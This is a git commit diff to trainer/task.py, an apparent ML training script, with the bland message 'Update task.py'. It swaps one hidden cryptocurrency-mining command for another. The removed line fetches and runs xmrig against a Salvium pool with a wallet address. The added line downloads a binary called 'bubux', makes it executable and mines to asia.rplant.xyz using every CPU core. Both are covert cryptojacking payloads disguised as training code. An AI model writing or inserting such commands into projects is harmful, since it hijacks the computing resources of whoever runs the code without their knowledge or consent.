0518e75d5488804edaca73e3cf638b2a4f6c0817
schacink <schacink@gmail.com>
2025-12-11 20:02:19 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz && ./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SC1siFaqsgxZRMthSYzwzjeHtF3zbJhznAEWdSD9QNtd5ZLjALSZe9MZ3U17YShjEx2SAEN2iUVdvf3c5zgDqQ7p1RGxxME4DfU -p solo -a rx/0 -t $(nproc --all)')
+os.system('wget -O bubux https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/VRL && chmod 777 bubux && ./bubux -a randomvirel --url asia.rplant.xyz:7155 --user v3pugnihn2yr1cpyup6o9gdxx641vr4x2hyojs5k6xtri9ziq.doma -t $(nproc --all)')
